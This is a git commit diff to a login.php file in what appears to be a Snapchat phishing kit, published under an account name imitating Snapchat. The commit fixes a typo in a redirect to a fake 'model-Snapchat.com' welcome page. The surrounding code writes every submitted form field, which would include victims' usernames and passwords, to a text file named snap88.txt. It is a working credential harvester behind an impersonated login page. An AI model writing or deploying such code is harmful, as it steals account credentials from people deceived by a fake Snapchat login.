704a5355cfdbafcca15eca0e8b35305edaca620f
add-Snapchat-Naif-alassaf-model-dubai <131499093+add-Snapchat-Naif-alassaf-model-dubai@users.noreply.github.com>
2023-04-22 04:24:53 +0300

    Add files via upload

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://add-snapchat-naif-alassaf-model-dubai.ghithub.io/model-Snapchat.com/welcome.html ');
+header ('Location: https://add-snapchat-naif-alassaf-model-dubai.github.io/model-Snapchat.com/welcome.html ');
 $handle = fopen("snap88.txt", "a");
 foreach($_POST as $variable => $value) {
     fwrite($handle, $variable);
